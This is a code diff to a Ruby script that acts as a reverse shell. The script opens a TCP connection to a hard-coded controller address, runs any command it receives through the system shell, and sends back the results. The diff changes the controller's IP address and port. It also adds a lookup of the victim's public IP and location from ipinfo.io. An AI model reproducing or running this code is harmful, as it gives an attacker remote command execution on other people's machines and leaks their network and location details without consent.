@@ -3,9 +3,10 @@
 require "socket"
 require "launchy"
 require "open-uri"
+require "net/http"
 
-host = "192.168.1.102"
-port = "8001"
+host = "192.168.1.101"
+port = "81"
 
 s = TCPSocket.open(host, port)
 
@@ -41,9 +42,12 @@ begin
     when "info"
       #system info
       host = Socket.gethostname
-      ip = UDPSocket.open {|s| s.connect("64.233.187.99", 1); s.addr.last}
-      s.puts("[*] Host name : #{host}")
-      s.puts("[*] Ip Address : #{ip}")
+      #ip = UDPSocket.open {|s| s.connect("64.233.187.99", 1); s.addr.last}
+      #s.puts("[*] Host name : #{host}")
+      #s.puts("[*] Ip Address : #{ip}")
+      res = Net::HTTP.get(URI("http://ipinfo.io/json"))
+      resf = res.to_s
+      s.puts("[*] Host name : #{host}\n\n#{resf}")
 
     else
       res = %x{#{comm}}
@@ -84,9 +88,12 @@ rescue
     when "info"
       #system info
       host = Socket.gethostname
-      ip = UDPSocket.open {|s| s.connect("64.233.187.99", 1); s.addr.last}
-      s.puts("[*] Host name : #{host}")
-      s.puts("[*] Ip Address : #{ip}")
+      #ip = UDPSocket.open {|s| s.connect("64.233.187.99", 1); s.addr.last}
+      #s.puts("[*] Host name : #{host}")
+      #s.puts("[*] Ip Address : #{ip}")
+      res = Net::HTTP.get(URI("http://ipinfo.io/json"))
+      resf = res.to_s
+      s.puts("[*] Host name : #{host}\n\n#{resf}")
 
     else
       res = %x{#{comm}}
